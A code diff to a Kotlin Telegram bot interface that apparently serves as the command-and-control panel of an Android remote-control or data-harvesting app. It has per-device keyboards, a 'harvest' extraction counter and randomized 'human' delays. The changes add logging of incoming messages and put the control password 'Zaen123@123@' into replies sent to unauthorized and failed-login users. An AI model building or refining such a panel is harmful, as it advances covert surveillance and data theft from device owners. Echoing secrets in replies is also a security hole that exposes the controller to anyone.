@@ -109,8 +109,18 @@ class TelegramUi(
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
     }
 
+    // ==================== دوال التحقق من كلمة السر ====================
+    
+    /**
+     * ✅ التحقق من كلمة السر مع تنظيف شامل من المسافات والأحرف الخفية
+     * مع تسجيل تشخيصي لنتيجة التحقق
+     */
     private fun verifyControlPassword(input: String): Boolean {
-        return input.trim().replace("\\s+".toRegex(), " ") == appPassword.trim()
+        val cleanInput = input.trim().replace("\\s+".toRegex(), " ")
+        val cleanSecret = appPassword.trim().replace("\\s+".toRegex(), " ")
+        val result = cleanInput == cleanSecret
+        writeLog("🔐 Password verification: ${if (result) "✅ SUCCESS" else "❌ FAIL"} (input length: ${input.length})")
+        return result
     }
 
     fun updatePassword(newPassword: String) {
@@ -128,6 +138,7 @@ class TelegramUi(
         }
     }
 
+    // ==================== دوال مساعدة ====================
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(1200, 4500))
     }
@@ -513,6 +524,11 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
+    // ============================================================
+    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً
+    //  جميع الإيموجيات المستخدمة هنا فريدة ولا تتكرر مع أي زر آخر
+    // ============================================================
+
     fun getMainControlKeyboard(): String {
         val keyboard = JSONArray().apply {
             put(JSONArray().apply {
@@ -558,7 +574,6 @@ class TelegramUi(
         }
     }
 
-    // ✅ تغيير إيموجي زر قطع الاتصال إلى 🚪
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج ($count)" else "📦 استخراج"
@@ -630,13 +645,23 @@ class TelegramUi(
         return true
     }
 
-    // ✅ تعديل handleMessage لتطبيق trim()
+    // ==================== معالجة الرسائل مع تسجيل تشخيصي محسن ====================
+    
+    /**
+     * ✅ معالجة الرسائل الواردة مع:
+     * - تسجيل وصول كل رسالة للتشخيص
+     * - تنظيف المدخلات من المسافات والأحرف الخفية
+     * - رد تشخيصي في حال فشل كلمة المرور
+     */
     private suspend fun handleMessage(update: JSONObject) {
         try {
             val msg = update.optJSONObject("message") ?: return
             val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
             val text = msg.optString("text", "").trim()
             val threadId = msg.optLong("message_thread_id", 0L)
+
+            // ✅ تسجيل وصول الرسالة للتشخيص
+            writeLog("📩 Received message from $chatId: '${text.take(50)}'")
 
             applyHumanDelay()
 
@@ -646,6 +671,7 @@ class TelegramUi(
                 else -> text.trim()
             }
 
+            // ✅ محاولة المصادقة
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
@@ -660,37 +686,48 @@ class TelegramUi(
                     put("reply_markup", keyboardJson)
                     put("parse_mode", "Markdown")
                 })
+                writeLog("✅ Login successful for chat: $chatId")
                 pulseIntent("🔓 تسجيل دخول")
                 return
-            } else if (isLoginCommand && secret.isEmpty()) {
+            } 
+            
+            // ✅ رد تشخيصي في حال فشل كلمة المرور
+            if (secret.isNotEmpty() && !verifyControlPassword(secret)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", getPasswordPromptText())
+                    put("text", "⚠️ كلمة المرور غير صحيحة.\nتأكد من نسخها تماماً: `Zaen123@123@`\n\n(لا توجد مسافات إضافية)")
                     put("parse_mode", "Markdown")
                 })
+                writeLog("❌ Invalid password attempt from $chatId")
                 return
             }
 
+            // ✅ طلب كلمة السر للمستخدمين غير المصرح لهم
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 الرجاء إدخال كلمة السر للتحكم")
+                    put("text", "🔐 الرجاء إدخال كلمة السر للتحكم\nاستخدم: `/login Zaen123@123@`")
+                    put("parse_mode", "Markdown")
                 })
-            } else {
-                apiCall("sendMessage", JSONObject().apply {
-                    put("chat_id", chatId)
-                    if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.")
-                })
+                writeLog("🔐 Unauthorized access attempt from $chatId")
+                return
             }
 
+            // ✅ أي نص آخر يتم تجاهله (لأن الأوامر النصية معطلة)
+            apiCall("sendMessage", JSONObject().apply {
+                put("chat_id", chatId)
+                if (threadId != 0L) put("message_thread_id", threadId)
+                put("text", "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.")
+            })
+
         } catch (e: Exception) {
-            writeLog("Handle message error: ${e.message}")
+            writeLog("❌ Handle message error: ${e.message}")
         }
     }
 
+    // ==================== معالجة استدعاءات الأزرار ====================
     private suspend fun handleCallback(update: JSONObject) {
         try {
             applyHumanDelay()
@@ -1096,7 +1133,6 @@ class TelegramUi(
         }
     }
 
-    // ✅ تحسين start() لتسجيل سبب الفشل
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
             writeLog("❌ No active tokens! Cannot start Telegram UI.")
